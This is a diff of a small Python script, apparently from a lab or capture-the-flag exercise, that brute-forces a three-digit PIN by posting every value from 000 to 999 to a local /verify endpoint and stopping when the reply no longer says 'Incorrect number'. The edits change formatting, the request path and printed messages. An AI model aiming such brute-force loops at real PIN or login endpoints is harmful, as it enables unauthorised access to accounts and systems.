@@ -1,5 +1,5 @@
 import socket
-import time  
+import time
 
 HOST = '127.0.0.1'
 PORT = 8888
@@ -8,13 +8,12 @@ last_output = None
 
 for attempt in range(1000):
     start = time.time()
+
     pin = str(attempt).zfill(3)
-    payload = f'magicNumber={pin}'
-
-
+    payload = f"magicNumber={pin}"
 
     request = (
-        "POST / HTTP/1.1\r\n"
+        "POST /verify HTTP/1.1\r\n"
         f"Host: {HOST}:{PORT}\r\n"
         "Content-Type: application/x-www-form-urlencoded\r\n"
         f"Content-Length: {len(payload)}\r\n"
@@ -45,10 +44,10 @@ for attempt in range(1000):
             last_output = output
 
         if "Incorrect number" not in output:
-            print(f"SUCCESS, YOU UNLOCK IT! PIN is: {pin}")
+            print(f"CONGRATS!YOU UNLOCK THE PIN WHICH is: {pin}")
             break
         else:
-            print(f"Trying PIN {pin} -> ENGK WRONG")
+            print(f"Try this PIN {pin} -> WRONG PIN")
 
         s.close()
 
